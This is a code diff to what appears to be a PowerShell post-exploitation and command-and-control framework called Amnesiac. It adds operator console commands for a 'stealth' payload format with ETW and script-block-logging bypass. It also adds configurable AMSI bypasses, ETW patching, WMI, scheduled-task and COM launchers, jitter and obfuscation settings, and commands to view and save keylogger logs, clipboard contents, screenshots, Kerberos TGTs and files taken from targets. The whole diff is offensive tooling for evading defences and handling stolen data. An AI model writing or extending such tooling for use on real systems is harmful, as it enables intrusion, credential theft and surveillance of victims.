@@ -650,14 +650,21 @@ function Amnesiac {
    			elseif($global:payloadformat -eq 'gzip'){
 				$global:payloadformat = 'exe'
 				$global:Message = " [+] Payload format: exe"
+				if (-not $global:DiskMode) {
+					$global:Message = " [!] exe format requires disk write. Enable with 'diskmode on' or switch format."
+				}
 			}
 			elseif($global:payloadformat -eq 'exe'){
+				$global:payloadformat = 'stealth'
+				$global:Message = " [+] Payload format: stealth (ETW+SBL bypass, random vars, gzip)"
+			}
+			elseif($global:payloadformat -eq 'stealth'){
 				$global:payloadformat = 'b64'
 				$global:Message = " [+] Payload format: cmd(b64)"
 			}
 			continue
 		}
-		
+
 		if ($choice -eq 'Find-LocalAdminAccess') {
 			if($global:localadminaccesspayload -eq 'SMB'){
 				$global:localadminaccesspayload = 'PSRemoting'
@@ -688,7 +695,224 @@ function Amnesiac {
 			$global:Message = " [+] New Global-Listener PipeName: $global:MultiPipeName | Revert: [GLSet $OldGlobalPipeName]"
 			continue
 		}
-		
+
+		if ($choice -match '^diskmode(\s+(on|off))?$') {
+			if ($Matches[2] -eq 'on') {
+				$global:DiskMode = $true
+				Initialize-DiskStructure
+				$global:Message = " [+] Disk mode: ON -- artifact directories created"
+			} elseif ($Matches[2] -eq 'off') {
+				$global:DiskMode = $false
+				$global:Message = " [+] Disk mode: OFF -- no disk writes on operator or target"
+			} else {
+				$state = if ($global:DiskMode) { "ON" } else { "OFF" }
+				$global:Message = " [+] Disk mode: $state"
+			}
+			continue
+		}
+
+		if ($choice -match '^artifacts(\s+(keylogger|screenshots|clipboard|tgts|downloads))?$') {
+			$type = $Matches[2]
+			if (-not $type) {
+				Write-Output ""
+				Write-Output " [+] In-memory artifacts:"
+				Write-Output "     Keylogger:   $($global:AmnesiacArtifacts.Keylogger.Count) entries"
+				Write-Output "     Screenshots: $($global:AmnesiacArtifacts.Screenshots.Count) items"
+				Write-Output "     Clipboard:   $($global:AmnesiacArtifacts.Clipboard.Count) entries"
+				Write-Output "     TGTs:        $($global:AmnesiacArtifacts.TGTs.Count) entries"
+				Write-Output "     Downloads:   $($global:AmnesiacArtifacts.Downloads.Count) files"
+				Write-Output ""
+			} elseif ($type -eq 'keylogger') {
+				if ($global:AmnesiacArtifacts.Keylogger.Count -eq 0) {
+					$global:Message = " [-] No keylogger data captured."
+				} else {
+					Write-Output ""
+					$global:AmnesiacArtifacts.Keylogger | ForEach-Object { Write-Output $_ }
+					Write-Output ""
+				}
+			} elseif ($type -eq 'clipboard') {
+				if ($global:AmnesiacArtifacts.Clipboard.Count -eq 0) {
+					$global:Message = " [-] No clipboard data captured."
+				} else {
+					$global:AmnesiacArtifacts.Clipboard | ForEach-Object { Write-Output $_ }
+				}
+			} elseif ($type -eq 'tgts') {
+				$global:AmnesiacArtifacts.TGTs | ForEach-Object { Write-Output $_ }
+			} elseif ($type -eq 'downloads') {
+				$global:AmnesiacArtifacts.Downloads.Keys | ForEach-Object {
+					$sz = $global:AmnesiacArtifacts.Downloads[$_].Length
+					Write-Output "  $_ ($sz bytes)"
+				}
+			} elseif ($type -eq 'screenshots') {
+				$global:Message = " [+] Screenshots: $($global:AmnesiacArtifacts.Screenshots.Count) captured (use 'save screenshots <path>' to write to disk)"
+			}
+			continue
+		}
+
+		if ($choice -match '^save(\s+(all|keylogger|screenshots|clipboard|tgts|downloads))?(\s+(.+))?$') {
+			$type = $Matches[2]
+			$path = if ($Matches[4]) { $Matches[4] } else { "$env:USERPROFILE\Desktop\amnesiac-artifacts" }
+			if ($type -eq 'all' -or -not $type) {
+				$null = New-Item -Path $path -ItemType Directory -Force
+				if ($global:AmnesiacArtifacts.Keylogger.Count -gt 0) {
+					$global:AmnesiacArtifacts.Keylogger | Out-File "$path\keylogger.txt" -Encoding UTF8
+				}
+				if ($global:AmnesiacArtifacts.Clipboard.Count -gt 0) {
+					$global:AmnesiacArtifacts.Clipboard | Out-File "$path\clipboard.txt" -Encoding UTF8
+				}
+				if ($global:AmnesiacArtifacts.TGTs.Count -gt 0) {
+					$global:AmnesiacArtifacts.TGTs | Out-File "$path\tgts.txt" -Encoding UTF8
+				}
+				$global:AmnesiacArtifacts.Downloads.GetEnumerator() | ForEach-Object {
+					[System.IO.File]::WriteAllBytes("$path\$($_.Key)", $_.Value)
+				}
+				$global:Message = " [+] Artifacts saved to: $path"
+			} elseif ($type -eq 'keylogger') {
+				$outFile = if ($Matches[4]) { $Matches[4] } else { "$env:USERPROFILE\Desktop\keylogger.txt" }
+				$global:AmnesiacArtifacts.Keylogger | Out-File $outFile -Encoding UTF8
+				$global:Message = " [+] Keylogger saved to: $outFile"
+			} elseif ($type -eq 'downloads') {
+				$null = New-Item -Path $path -ItemType Directory -Force
+				$global:AmnesiacArtifacts.Downloads.GetEnumerator() | ForEach-Object {
+					[System.IO.File]::WriteAllBytes("$path\$($_.Key)", $_.Value)
+				}
+				$global:Message = " [+] Downloads saved to: $path"
+			} elseif ($type -eq 'clipboard') {
+				$outFile = if ($Matches[4]) { $Matches[4] } else { "$env:USERPROFILE\Desktop\clipboard.txt" }
+				$global:AmnesiacArtifacts.Clipboard | Out-File $outFile -Encoding UTF8
+				$global:Message = " [+] Clipboard saved to: $outFile"
+			} elseif ($type -eq 'tgts') {
+				$outFile = if ($Matches[4]) { $Matches[4] } else { "$env:USERPROFILE\Desktop\tgts.txt" }
+				$global:AmnesiacArtifacts.TGTs | Out-File $outFile -Encoding UTF8
+				$global:Message = " [+] TGTs saved to: $outFile"
+			} elseif ($type -eq 'screenshots') {
+				$null = New-Item -Path $path -ItemType Directory -Force
+				$i = 0
+				$global:AmnesiacArtifacts.Screenshots | ForEach-Object {
+					[System.IO.File]::WriteAllBytes("$path\screenshot_$i.png", $_)
+					$i++
+				}
+				$global:Message = " [+] $i screenshot(s) saved to: $path"
+			}
+			continue
+		}
+
+		if ($choice -match '^modules(\s+(reload|status))?$') {
+			$sub = $Matches[2]
+			if ($sub -eq 'reload') {
+				Initialize-ToolCache
+				$global:Message = " [+] Tool cache refreshed: $($global:ToolCache.Count) modules"
+			} elseif ($sub -eq 'status') {
+				Write-Output ""
+				Write-Output " [+] Tool cache breakdown:"
+				$coreNames  = @('SimpleAMSI','NETAMSI','Token-Impersonation','Invoke-SMBRemoting','Invoke-WMIRemoting','Find-LocalAdminAccess')
+				$heavyNames = @('Suntour','Ferrari','ppl','TermsrvPatcher','RDPKeylog.exe')
+				$core  = $coreNames  | Where-Object { $global:ToolCache.ContainsKey($_) }
+				$std   = $global:ToolCache.Keys | Where-Object { $_ -notin $coreNames -and $_ -notin $heavyNames }
+				$heavy = $heavyNames | Where-Object { $global:ToolCache.ContainsKey($_) }
+				Write-Output "  Core    (embedded): $($core.Count)/$($coreNames.Count) -- $($core -join ', ')"
+				Write-Output "  Standard (Tools\):  $($std.Count) -- $($std -join ', ')"
+				Write-Output "  Heavy   (HTTP):     $($heavy.Count)/$($heavyNames.Count) -- run 'serve' to load"
+				Write-Output ""
+			} else {
+				Write-Output ""
+				Write-Output " [+] Cached modules ($($global:ToolCache.Count)):"
+				$global:ToolCache.Keys | Sort-Object | ForEach-Object { Write-Output "  [+] $_" }
+				Write-Output ""
+			}
+			continue
+		}
+
+		if ($choice -match '^payload(\s+(.+))?$') {
+			$sub = ($Matches[2] -split '\s+', 3)
+			$subcmd = $sub[0]; $val = if ($sub.Count -ge 2) { $sub[1] } else { $null }; $extra = if ($sub.Count -ge 3) { $sub[2] } else { $null }
+			switch ($subcmd) {
+				'amsi' {
+					if ($val -in 'pageguard','hwbp','fail','direct') {
+						$global:PayloadConfig.Amsi = $val
+						$global:Message = " [+] Payload AMSI bypass: $val"
+						if ($val -in 'pageguard','hwbp') { $global:Message += " (PS uses 'fail' fallback; full $val activates after 'load loader')" }
+					} else { $global:Message = " [-] Valid: pageguard hwbp fail direct" }
+				}
+				'etw' {
+					if ($val -in 'provider','patch','thread') { $global:PayloadConfig.Etw = $val; $global:Message = " [+] Payload ETW: $val" }
+					else { $global:Message = " [-] Valid: provider patch thread" }
+				}
+				'launcher' {
+					if ($val -in 'ps','wmi','schtask','com') { $global:PayloadConfig.Launcher = $val; $global:Message = " [+] Payload launcher: $val" }
+					else { $global:Message = " [-] Valid: ps wmi schtask com" }
+				}
+				'encoding' {
+					if ($val -in 'gzip','b64','raw','pwraw') { $global:PayloadConfig.Encoding = $val; $global:payloadformat = $val; $global:Message = " [+] Payload encoding: $val" }
+					else { $global:Message = " [-] Valid: gzip b64 raw pwraw" }
+				}
+				'jitter' {
+					if ($val -in 'off','low','medium','high') { $global:PayloadConfig.Jitter = $val; $global:Message = " [+] Payload jitter: $val" }
+					else { $global:Message = " [-] Valid: off low medium high" }
+				}
+				'obfuscation' {
+					if ($val -in 'low','medium','high') { $global:PayloadConfig.Obfuscation = $val; $global:Message = " [+] Payload obfuscation: $val" }
+					else { $global:Message = " [-] Valid: low medium high" }
+				}
+				'key' {
+					if ($val -in 'hostname','domain','user' -and $extra) { $global:PayloadConfig.Keys[$val] = $extra; $global:Message = " [+] Payload key $val = $extra" }
+					elseif ($val -eq 'clear') { $global:PayloadConfig.Keys = @{}; $global:Message = " [+] Payload keys cleared" }
+					elseif ($val -eq 'show') {
+						if ($global:PayloadConfig.Keys.Count -eq 0) { $global:Message = " [-] No payload keys set" }
+						else { $global:PayloadConfig.Keys.GetEnumerator() | % { Write-Output "  $($_.Key) = $($_.Value)" } }
+					} else { $global:Message = " [-] Usage: payload key [hostname|domain|user] <value>  |  payload key clear|show" }
+				}
+				'reset' {
+					$global:PayloadConfig = @{ Amsi='pageguard'; Etw='provider'; Sbl=$true; Launcher='ps'; Encoding='gzip'; Jitter='medium'; Obfuscation='high'; Keys=@{} }
+					$global:Message = " [+] Payload config reset to defaults"
+				}
+				default {
+					Write-Output ""; Write-Output " [+] Current payload configuration:"
+					Write-Output "     amsi:        $($global:PayloadConfig.Amsi)"
+					Write-Output "     etw:         $($global:PayloadConfig.Etw)"
+					Write-Output "     sbl:         $($global:PayloadConfig.Sbl)"
+					Write-Output "     launcher:    $($global:PayloadConfig.Launcher)"
+					Write-Output "     encoding:    $($global:PayloadConfig.Encoding)"
+					Write-Output "     jitter:      $($global:PayloadConfig.Jitter)"
+					Write-Output "     obfuscation: $($global:PayloadConfig.Obfuscation)"
+					if ($global:PayloadConfig.Keys.Count -gt 0) { Write-Output "     keys:        $($global:PayloadConfig.Keys | ConvertTo-Json -Compress)" }
+					else { Write-Output "     keys:        (none)" }; Write-Output ""
+				}
+			}
+			continue
+		}
+
+		if ($choice -match '^psk(\s+(.+))?$') {
+			$arg = $Matches[2]
+			if (-not $arg) {
+				if ($global:PSKBytes) { $global:Message = " [+] PSK: configured (masked)" } else { $global:Message = " [+] PSK: using default (derived from pipe name)" }
+			} elseif ($arg -eq 'reset') {
+				$global:PSKPhrase = $null; $global:PSKBytes = $null; $global:Message = " [+] PSK reset to default"
+			} else {
+				$global:PSKPhrase = $arg; $global:PSKBytes = Get-PskDerivedKey -Passphrase $arg; $global:Message = " [+] PSK configured"
+			}
+			continue
+		}
+
+		if ($choice -match '^engagement(\s+(nondomained|domained|reset))?$') {
+			$profile = $Matches[2]
+			switch ($profile) {
+				'nondomained' {
+					$global:EngagementProfile = 'nondomained'
+					$tokenOk = Test-NetworkLogonToken
+					if ($tokenOk) { $id = [System.Security.Principal.WindowsIdentity]::GetCurrent(); $global:Message = " [+] Engagement: nondomained | Network token: $($id.Name)" }
+					else {
+						Write-Output ""; Write-Output " [!] WARNING: No network logon token detected."
+						Write-Output "     Launch Amnesiac from: runas /netonly /user:DOMAIN\user powershell.exe"; Write-Output ""
+					}
+				}
+				'domained' { $global:EngagementProfile = 'domained'; $global:Message = " [+] Engagement: domained (assumed breach)" }
+				'reset'    { $global:EngagementProfile = $null; $global:Message = " [+] Engagement profile cleared" }
+				default    { $state = if ($global:EngagementProfile) { $global:EngagementProfile } else { "(not set)" }; $global:Message = " [+] Engagement: $state" }
+			}
+			continue
+		}
+
 		if ($choice -eq 'exit') {
 			
 			for ($i = $global:listenerSessions.Count - 1; $i -ge 0; $i--) {
